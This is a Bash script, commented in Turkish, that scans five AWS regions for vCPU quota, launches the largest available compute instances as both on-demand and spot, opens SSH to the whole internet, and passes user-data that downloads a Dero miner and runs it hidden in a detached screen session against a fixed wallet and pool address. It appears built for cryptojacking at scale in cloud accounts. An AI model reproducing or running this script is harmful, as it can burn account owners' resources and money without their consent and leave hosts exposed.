#!/bin/bash

# ------------------------------------------------------------------------------
# Bu script, belirtilen her bölgede, vCPU limiti yeterliyse ve desteklenen bir
# instance türü varsa, hem On-Demand hem de Spot instance oluşturur.
# ------------------------------------------------------------------------------

# Instance türleri
declare -a instance_types=("m7a.16xlarge" "c7a.16xlarge" "r7a.16xlarge")

# Bölgeler
declare -a regions=("eu-west-1" "eu-north-1" "us-east-1" "us-west-2" "eu-central-1")

# Bölgelere göre AMI ID'leri (ARM64 Ubuntu 24)
declare -A ami_ids
ami_ids["eu-west-1"]="ami-arm64-ubuntu24-euw1"  # Geçerli bir AMI ID ile değiştirin
ami_ids["eu-north-1"]="ami-0c1ac8a41498c1a9c"
ami_ids["us-east-1"]="ami-084568db4383264d4"
ami_ids["us-west-2"]="ami-075686beab831bb7f"
ami_ids["eu-central-1"]="ami-arm64-ubuntu24-euc1"  # Geçerli bir AMI ID ile değiştirin

# Başarı/başarısızlık takibi için diziler
success_list_on_demand=()
success_list_spot=()
failed_regions_on_demand=()
failed_regions_spot=()

# ------------------------------------------------------------------------------
# Fonksiyon: check_vcpu_limit
# ------------------------------------------------------------------------------
# Verilen bölgedeki On-Demand vCPU limitini (Quota kodu: L-1216C47A) kontrol eder.
# vCPU limiti >= 64 ise 0 (başarı), aksi takdirde 1 döndürür.
# ------------------------------------------------------------------------------
check_vcpu_limit() {
    local region=$1
    echo "Bölge $region için vCPU limiti kontrol ediliyor..."

    local vcpu_limit
    vcpu_limit=$(aws service-quotas get-service-quota \
        --region "$region" \
        --service-code ec2 \
        --quota-code L-1216C47A \
        --query "Quota.Value" --output text 2>/dev/null)

    # Limiti tam sayıya çevir
    vcpu_limit=$(printf "%.0f" "$vcpu_limit" 2>/dev/null)

    if [ -z "$vcpu_limit" ]; then
        echo "vCPU limiti alınamadı. Bölge $region atlanıyor."
        return 1
    fi

    echo "vCPU Limiti: $vcpu_limit"
    if (( vcpu_limit < 64 )); then
        echo "vCPU limiti yetersiz. Bölge $region atlanıyor."
        return 1
    fi

    return 0
}

# ------------------------------------------------------------------------------
# Fonksiyon: find_instance_type
# ------------------------------------------------------------------------------
# instance_types dizisini rastgele karıştırır ve verilen bölgede sunulan ilk
# instance türünü döndürür. Hiçbiri bulunamazsa boş string döndürür.
# ------------------------------------------------------------------------------
find_instance_type() {
    local region=$1
    for instance_type in $(shuf -e "${instance_types[@]}"); do
        local available
        available=$(aws ec2 describe-instance-type-offerings \
            --region "$region" \
            --filters "Name=instance-type,Values=$instance_type" "Name=location,Values=$region" \
            --query "InstanceTypeOfferings | length(@)" --output text 2>/dev/null)

        if [ "$available" -gt 0 ]; then
            echo "$instance_type"
            return
        fi
    done
    echo ""
}

# ------------------------------------------------------------------------------
# Fonksiyon: create_instance
# ------------------------------------------------------------------------------
# Belirtilen bölgede EC2 instance (on-demand veya spot) oluşturur.
# Parametreler:
#   1) region
#   2) market_type ("on-demand" veya "spot")
#   3) instance_type
#   4) ami_id
# ------------------------------------------------------------------------------
create_instance() {
    local region="$1"
    local market_type="$2"
    local instance_type="$3"
    local ami_id="$4"

    # Varsayılan güvenlik grubu ID'sini al
    local security_group_id
    security_group_id=$(aws ec2 describe-security-groups \
        --region "$region" \
        --filters "Name=group-name,Values=default" \
        --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    # SSH (22 portu) için herkese açık erişim (üretim ortamı için önerilmez)
    aws ec2 authorize-security-group-ingress \
        --region "$region" \
        --group-id "$security_group_id" \
        --protocol tcp --port 22 --cidr 0.0.0.0/0 \
        2>/dev/null || true

    # Paketleri kurmak ve madenciyi çalıştırmak için kullanıcı verisi
    local user_data
    user_data=$(cat <<EOF
#!/bin/bash
sudo apt update -y
sudo apt install -y wget screen
cd /root
wget https://github.com/DeroLuna/dero-miner/releases/download/v1.14/deroluna-v1.14_linux_hiveos_mmpos.tar.gz
tar -xvf deroluna-v1.14_linux_hiveos_mmpos.tar.gz
cd deroluna
screen -dmS dero ./deroluna-miner -w dero1qyy8lusws59e50q9pru6wjt709jcgjle8t4qfmjfm25kzk32s0z8gqgp35cum -d 144.91.103.135:10100
EOF
    )

    # AWS CLI komutunu oluştur
    local market_options=""
    local instance_id=""

    if [ "$market_type" == "spot" ]; then
        # Spot instance
        instance_id=$(aws ec2 run-instances \
            --region "$region" \
            --image-id "$ami_id" \
            --instance-type "$instance_type" \
            --security-group-ids "$security_group_id" \
            --instance-market-options '{"MarketType":"spot"}' \
            --user-data "$user_data" \
            --count 1 \
            --query 'Instances[0].InstanceId' \
            --output text 2>/dev/null)
    else
        # On-demand instance
        instance_id=$(aws ec2 run-instances \
            --region "$region" \
            --image-id "$ami_id" \
            --instance-type "$instance_type" \
            --security-group-ids "$security_group_id" \
            --user-data "$user_data" \
            --count 1 \
            --query 'Instances[0].InstanceId' \
            --output text 2>/dev/null)
    fi

    echo "$instance_id"
}

# ------------------------------------------------------------------------------
# ANA SCRIPT: Her bölge için On-Demand ve Spot oluştur
# ------------------------------------------------------------------------------
for region in "${regions[@]}"; do

    echo "********************************************************"
    echo "Bölge: $region"

    # Önce vCPU limitini kontrol et
    if ! check_vcpu_limit "$region"; then
        continue  # Bu bölgeyi atla
    fi

    # Uygun bir instance türü bul
    chosen_type=$(find_instance_type "$region")
    if [ -z "$chosen_type" ]; then
        echo "$region bölgesinde uygun bir instance türü bulunamadı."
        # On-Demand veya Spot için denemeye gerek yok; bölge her ikisi için başarısız
        failed_regions_on_demand+=("$region")
        failed_regions_spot+=("$region")
        continue
    fi
    echo "Seçilen instance türü: $chosen_type"

    # AMI ID'sini al
    ami_id="${ami_ids[$region]}"
    if [ -z "$ami_id" ]; then
        echo "$region bölgesi için AMI ID'si tanımlanmamış."
        # On-Demand veya Spot için denemeye gerek yok; bölge her ikisi için başarısız
        failed_regions_on_demand+=("$region")
        failed_regions_spot+=("$region")
        continue
    fi

    # ------------------------------------------------------------------
    # ON-DEMAND instance oluştur
    echo "---- On-Demand instance oluşturuluyor..."
    ondemand_instance_id=$(create_instance "$region" "on-demand" "$chosen_type" "$ami_id")

    if [ -n "$ondemand_instance_id" ] && [ "$ondemand_instance_id" != "None" ]; then
        echo "On-Demand instance oluşturuldu: $ondemand_instance_id"
        success_list_on_demand+=("$region:$chosen_type:$ondemand_instance_id")
    else
        echo "On-Demand instance oluşturulamadı."
        failed_regions_on_demand+=("$region")
    fi

    # ------------------------------------------------------------------
    # SPOT instance oluştur
    echo "---- Spot instance oluşturuluyor..."
    spot_instance_id=$(create_instance "$region" "spot" "$chosen_type" "$ami_id")

    if [ -n "$spot_instance_id" ] && [ "$spot_instance_id" != "None" ]; then
        echo "Spot instance oluşturuldu: $spot_instance_id"
        success_list_spot+=("$region:$chosen_type:$spot_instance_id")
    else
        echo "Spot instance oluşturulamadı."
        failed_regions_spot+=("$region")
    fi

done

# ------------------------------------------------------------------------------
# Özet Yazdır
# ------------------------------------------------------------------------------
echo "==========================================================="
echo "On-Demand Başarılı bölgeler:"
printf '%s\n' "${success_list_on_demand[@]}"

echo "On-Demand Başarısız bölgeler:"
printf '%s\n' "${failed_regions_on_demand[@]}"

echo "-----------------------------------------------------------"
echo "Spot Başarılı bölgeler:"
printf '%s\n' "${success_list_spot[@]}"

echo "Spot Başarısız bölgeler:"
printf '%s\n' "${failed_regions_spot[@]}"